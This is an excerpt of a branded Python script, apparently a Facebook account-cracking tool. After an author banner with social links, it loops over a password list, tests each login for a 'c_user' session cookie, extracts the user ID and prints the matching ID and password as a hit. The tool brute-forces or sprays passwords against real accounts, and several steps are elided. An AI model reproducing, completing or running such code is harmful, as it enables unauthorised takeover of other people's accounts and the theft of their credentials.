...
`--'   `'-'   '.(_,_).'   `--------``--------` '.(_,_).' '--'    '--'        
                                                                             print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s𝙈𝙧. Kallan                   %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : kallan%s║"%(Z,B,Z))
	print("%s║%s  Facebook : https://www.facebook.com/profile.php?id=100086270594350   %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [kallan-CP] '+uidx+' | '+pasw+'\033[0;97m')
